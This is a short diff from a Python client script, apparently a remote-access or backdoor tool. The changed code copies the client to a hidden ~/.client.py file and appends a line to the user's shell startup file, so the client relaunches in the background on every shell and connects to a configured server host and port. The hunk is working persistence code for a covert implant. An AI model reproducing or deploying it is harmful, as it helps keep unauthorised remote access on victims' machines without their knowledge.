@@ -106,7 +106,7 @@ try:
 
     #If we want to make it persistent and a file to edit exists, do it.
     if MAKE_PERSISTENT and not NO_PERSISTENCE: 
-        subprocess.run(f"cp client.py {os.path.expanduser('~')}/.client.py",shell=True) #Copy the client to their home dir and make it .client.py
+        subprocess.run(f"cp /usr/local/bin/.client.py {os.path.expanduser('~')}/.client.py",shell=True) #Copy the client to their home dir and make it .client.py
         with open(f"{os.path.expanduser('~')}/{rcFile}","a",) as file:
             file.write(f"python3 {os.path.expanduser('~')}/.client.py {SERVER_HOST} {SERVER_PORT} &\n")
 except:
